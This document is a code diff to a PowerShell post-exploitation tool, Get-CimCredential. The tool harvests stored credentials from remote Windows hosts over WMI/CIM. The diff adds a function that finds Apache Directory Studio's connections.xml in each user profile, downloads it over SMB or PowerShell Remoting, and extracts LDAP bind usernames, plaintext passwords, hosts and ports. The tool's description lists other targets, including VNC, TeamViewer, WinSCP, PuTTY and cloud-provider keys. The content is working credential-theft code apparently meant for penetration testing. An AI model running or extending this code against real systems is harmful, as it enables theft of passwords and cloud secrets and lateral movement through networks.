@@ -11,7 +11,7 @@ Function Get-CimCredential {
 .DESCRIPTION
     Get-CimCredential enumerates registry keys and files containing credentials on a remote host through WMI.
     Credential files can be optionally downloaded via SMB or PowerShell Remoting.
-    Gathered credentials include autologon, unattended files, VNC, TeamViewer (CVE-2018-14333), WinSCP, PuTTY, AWS, Azure, Google Cloud Plateform, Bluemix.
+    Gathered credentials include autologon, unattended files, VNC, TeamViewer (CVE-2018-14333), WinSCP, PuTTY, Apache Directory Studio, AWS, Azure, Google Cloud Plateform, Bluemix.
 
 .PARAMETER ComputerName
     Specifies the target host.
@@ -155,7 +155,6 @@ Function Get-CimCredential {
             "Bluemix-Config2"           = "\.bluemix\.cf\config.json"
             # Sessions
             "MTPuTTy"                   = "\AppData\Roaming\TTYPlus\mtputty.xml"
-            "ApacheDirectoryStudio"     = "\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml"
         }
 
         Get-CimInstance -ClassName Win32_UserProfile -CimSession $cimSession -Verbose:$false | ForEach-Object {
@@ -163,6 +162,7 @@ Function Get-CimCredential {
 
             Get-FilezillaCredentialFile -ProfilePath $profilePath -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession
             Get-MRNGCredentialFile -ProfilePath $profilePath -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession
+            Get-ApacheDirectoryStudioCredentialFile -ProfilePath $profilePath -CimSession $cimSession -Download:$DownloadFiles -Credential $Credential -PSSession $psSession
 
             foreach ($userFile in $userFiles.GetEnumerator()) {
                 $filePath = ($_.LocalPath + $userFile.Value) -replace '\\','\\'
@@ -1125,6 +1125,87 @@ Function Local:Get-MRNGCredentialFile {
                     $cred = Get-MRNGCredential $node
                     foreach ($c in $cred) {
                         $creds.Add(($c)) | Out-Null
+                    }
+                }
+                if ($creds.Count -gt 0) {
+                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
+                    Write-Output $result
+                }
+            }
+            else {
+                $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value @()
+                Write-Output $result
+            }
+        }
+    }
+
+    END {}
+}
+
+Function Local:Get-ApacheDirectoryStudioCredentialFile {
+    Param (
+        [Parameter(Mandatory = $True)]
+        [string]
+        $ProfilePath,
+
+        [Parameter(Mandatory = $True)]
+        [CimSession]
+        $CimSession,
+
+        [Switch]
+        $Download,
+
+        [Management.Automation.Runspaces.PSSession]
+        $PSSession,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )
+
+    BEGIN {
+        $ComputerName = $CimSession.ComputerName
+    }
+
+    PROCESS {
+        $userFile = "\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml"
+        $filePath = ($ProfilePath + $userFile) -replace '\\','\\'
+        $file = Get-CimInstance -Class CIM_LogicalFile -Filter "Name='$filePath'" -CimSession $CimSession -Verbose:$false
+        if ($file.Name) {
+            $result = New-Object -TypeName PSObject
+            $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+            $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'ApacheDirectoryStudio'
+            $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
+            $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
+            $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
+
+            if ($Download) {
+                $outputDir = "$PWD\$ComputerName"
+                $temp = $ProfilePath -split "\\"
+                $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))_$($file.FileName).$($file.Extension)"
+                New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
+                if ($PSSession) {
+                    Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -PSSession $PSSession
+                }
+                else {
+                    Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Credential $Credential
+                }
+                # Extract credentials from file
+                $xml = [Xml] (Get-Content $outputFile)
+                $nodes = $xml.SelectNodes('//connections')
+                $creds = New-Object Collections.ArrayList
+                foreach($node in $nodes) {
+                    $node.ChildNodes | ForEach-Object {
+                        if ($_.bindPassword) {
+                            $cred = @{}
+                            $cred["Username"] = $_.bindPrincipal
+                            $cred["Password"] = $_.bindPassword
+                            $cred["Hostname"] = $_.host
+                            $cred["Port"] = $_.port
+                            $cred["Protocol"] = 'LDAP'
+                            $creds.Add((New-Object PSObject -Property $cred)) | Out-Null
+                        }
                     }
                 }
                 if ($creds.Count -gt 0) {
